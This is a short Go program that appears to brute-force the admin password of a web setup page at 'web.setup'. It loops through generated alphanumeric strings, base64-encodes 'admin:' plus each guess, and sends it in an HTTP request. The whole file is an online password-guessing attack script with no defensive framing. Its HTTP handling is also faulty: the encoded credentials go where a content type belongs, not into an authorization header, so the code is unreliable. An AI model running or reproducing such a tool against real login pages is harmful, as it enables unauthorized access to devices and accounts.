package main
import(
	"fmt"
	"net/http"
	"log"
	"io/ioutil"
	"encoding/base64"
	"strings"
)

func main(){
	pass := "zp61"
	for {
		pass = nextstr(pass)
		send(pass)
	}
}

func send(pass string){
	bs := base64.StdEncoding.EncodeToString([]byte("admin:" + pass))
	r, err := http.Get("http://web.setup/");catch(err)
	resp, err := http.Post("http://web.setup/", bs, r.Body);catch(err)
	body, err := ioutil.ReadAll(resp.Body);catch(err)
	if !strings.Contains(string(body), "admin"){
		fmt.Println("contains admin:", pass)
	}else{
		fmt.Print("\r" + pass)
	}
}

func nextstr(str string) string{
	b := []byte(str)
	for n, v := range b{
		switch(v){
		case '9':
			b[n] = 'a'
		case 'z':
			b[n] = '0'
			continue
		default:
			b[n]++
		}
		break
	}
	flag := true
	for _, v := range b{
		if v != '0'{
			flag = false
			break
		}
	}
	if flag{
		b = append([]byte("0"), b...)
	}
	return string(b)
}

func catch(err error){
	if err != nil{
		fmt.Println()
		log.Fatal(err, "\n")
	}
}